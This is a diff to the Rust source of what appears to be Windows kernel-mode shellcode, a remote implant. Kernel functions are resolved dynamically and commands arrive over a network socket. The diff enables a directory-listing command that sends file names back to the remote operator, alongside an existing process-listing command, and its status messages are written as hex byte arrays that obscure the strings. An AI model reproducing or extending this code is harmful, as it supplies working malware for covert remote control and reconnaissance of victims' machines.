@@ -50,12 +50,10 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
         core::mem::size_of::<ntmem::MemDumpFuncs>()
     ) as _;
 
-    /*
     let fs_funcs: *mut ntfs::FsFuncs = ex_allocate_pool(
         ntdef::enums::POOL_TYPE::NonPagedPool,
         core::mem::size_of::<ntfs::FsFuncs>()
-    ) as _;
-    */
+    ) as _;    
 
     (*tdi_ctx).funcs.ex_allocate_pool =                     ex_allocate_pool;
     (*tdi_ctx).funcs.ex_free_pool_with_tag =                ntproc::find!("ExFreePoolWithTag");
@@ -81,11 +79,12 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
     (*mem_funcs).zw_query_information_process =             ntproc::find!("ZwQueryInformationProcess");
     (*mem_funcs).zw_query_virtual_memory =                  ntproc::find!("ZwQueryVirtualMemory");
 
-    /*
+    
     (*fs_funcs).zw_create_file =                            (*tdi_ctx).funcs.zw_create_file;
     (*fs_funcs).zw_query_directory_file =                   ntproc::find!("ZwQueryDirectoryFile");
     (*fs_funcs).zw_close =                                  ntproc::find!("ZwClose");
-    */
+    (*fs_funcs).ex_allocate_pool =                          ex_allocate_pool;
+    (*fs_funcs).ex_free_pool_with_tag =                     (*tdi_ctx).funcs.ex_free_pool_with_tag;
 
     let rtl_get_version: ntdef::functions::RtlGetVersion =  ntproc::find!("RtlGetVersion");
     let ps_terminate_system_thread: ntdef::functions::PsTerminateSystemThread = ntproc::find!("PsTerminateSystemThread");
@@ -108,11 +107,9 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
         ntdef::enums::POOL_TYPE::NonPagedPool, 1460 as _
     );
 
-    /*
     let scratch_buf: ntdef::types::PVOID = ((*tdi_ctx).funcs.ex_allocate_pool)(
         ntdef::enums::POOL_TYPE::NonPagedPool, 3000 as _
     );
-    */
     
     let mut buf_len: u32 = 0;
     let mut exec: u32 = 0 as _;
@@ -231,9 +228,10 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                 let pslist_end_msg = [0x70u8, 0x72u8, 0x6fu8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x20u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x65u8, 0x6eu8, 0x64u8, 0x0au8];
                 let _ = socket.send(&pslist_end_msg as *const u8, 20 as _);
             } else if ntdef::macros::RtlEqualMemory(buf as _, &dir_cmd as _, 4) == 1u32 {
+                /*
                 let not_implemented_msg = [0x6eu8, 0x6fu8, 0x74u8, 0x20u8, 0x69u8, 0x6du8, 0x70u8, 0x6cu8, 0x65u8, 0x6du8, 0x65u8, 0x6eu8, 0x74u8, 0x65u8, 0x64u8, 0x0au8];
                 let _ = socket.send(&not_implemented_msg as *const u8, 16);
-                /*
+                */             
                 *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                 let mut dir_open_error: u32 = 0;
                 let mut handle: ntdef::types::HANDLE = scratch_buf as _;
@@ -246,28 +244,32 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                         }
                     };
                 if dir_open_error == 0 as _ {
-                    // HERE: error in this branch, after query_directory
-                    let dir_send_start_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x65u8, 0x64u8, 0x2cu8, 0x20u8, 0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x73u8, 0x0au8];
-                    let _ = socket.send(&dir_send_start_msg as *const u8, 32 as _);
                     let mut file_names_information = buf as ntdef::structs::PFILE_NAMES_INFORMATION;
-                    let _ = ntfs::query_directory(fs_funcs, handle, file_names_information as _);
-                    while (*file_names_information).NextEntryOffset != 0 {
-                        // note: FileName is wide character array
-                        let file_name: *const u16 = &((*file_names_information).FileName) as _;
-                        let file_name_length = ((*file_names_information).FileNameLength) * 2;
-                        let _ = socket.send(file_name as _, file_name_length as _);
-                        file_names_information = (file_names_information as *mut u8).offset(
-                            (*file_names_information).NextEntryOffset as _
-                        ) as ntdef::structs::PFILE_NAMES_INFORMATION;
+                    let status = ntfs::query_directory(fs_funcs, handle, file_names_information as _);
+                    if status == 0 as _ {
+                        let dir_send_start_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x65u8, 0x64u8, 0x2cu8, 0x20u8, 0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x73u8, 0x0au8];
+                        let _ = socket.send(&dir_send_start_msg as *const u8, 32 as _);
+                        while (*file_names_information).NextEntryOffset != 0 {
+                            // note: FileName is wide character array
+                            let file_name: *const u16 = &((*file_names_information).FileName) as _;
+                            let file_name_length = ((*file_names_information).FileNameLength) * 2;
+                            let _ = socket.send(file_name as _, file_name_length as _);
+                            file_names_information = (file_names_information as *mut u8).offset(
+                                (*file_names_information).NextEntryOffset as _
+                            ) as ntdef::structs::PFILE_NAMES_INFORMATION;
+                        }
+                        let dir_listing_finished_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6eu8, 0x69u8, 0x73u8, 0x68u8, 0x65u8, 0x64u8, 0x0au8];
+                        let _ = socket.send(&dir_listing_finished_msg as *const u8, 27 as _);
+                    } else {
+                        let error_while_querying_opened_dir_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x68u8, 0x69u8, 0x6cu8, 0x65u8, 0x20u8, 0x71u8, 0x75u8, 0x65u8, 0x72u8, 0x79u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x65u8, 0x64u8, 0x20u8, 0x64u8, 0x69u8, 0x72u8, 0x0au8];
+                        let _ = socket.send(&error_while_querying_opened_dir_msg as *const u8, 32 as _);
                     }
-                    let dir_listing_finished_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6eu8, 0x69u8, 0x73u8, 0x68u8, 0x65u8, 0x64u8, 0x0au8];
-                    let _ = socket.send(&dir_listing_finished_msg as *const u8, 27 as _);
                     ntfs::close_handle(fs_funcs, handle);
                 } else {
                     let dir_open_error_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x69u8, 0x74u8, 0x68u8, 0x20u8, 0x73u8, 0x70u8, 0x65u8, 0x63u8, 0x69u8, 0x66u8, 0x69u8, 0x65u8, 0x64u8, 0x20u8, 0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x0au8];
                     let _ = socket.send(&dir_open_error_msg as *const u8, 31);
                 }
-                */
+                
             } else {
                 let invalid_cmd = [0x69u8, 0x6eu8, 0x76u8, 0x61u8, 0x6cu8, 0x69u8, 0x64u8, 0x20u8, 0x63u8, 0x6fu8, 0x6du8, 0x6du8, 0x61u8, 0x6eu8, 0x64u8, 0x0au8];
                 let _ = socket.send(&invalid_cmd as *const u8, 16 as _);
